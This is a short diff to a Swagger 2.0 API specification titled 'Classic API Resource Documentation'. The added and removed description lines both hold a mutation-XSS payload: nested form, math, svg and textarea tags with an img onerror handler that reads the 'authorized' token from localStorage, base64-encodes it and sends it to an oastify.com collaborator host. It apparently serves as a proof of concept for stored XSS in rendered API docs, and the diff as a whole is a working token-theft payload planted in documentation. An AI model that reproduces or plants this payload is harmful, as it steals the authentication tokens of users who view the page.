@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=1 onerror='(new Image()).src="https://nc3zomgglwxdgzn708l6vyysyj4as1mpb.oastify.com/?token="+btoa(localStorage.getItem("authorized"));'></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=1 onerror='var img = new Image(); img.src=\"https://nc3zomgglwxdgzn708l6vyysyj4as1mpb.oastify.com/?token=\"+btoa(localStorage.getItem(\"authorized\"));'></form>
   version: production
 basePath: /JSSResource/
 produces:
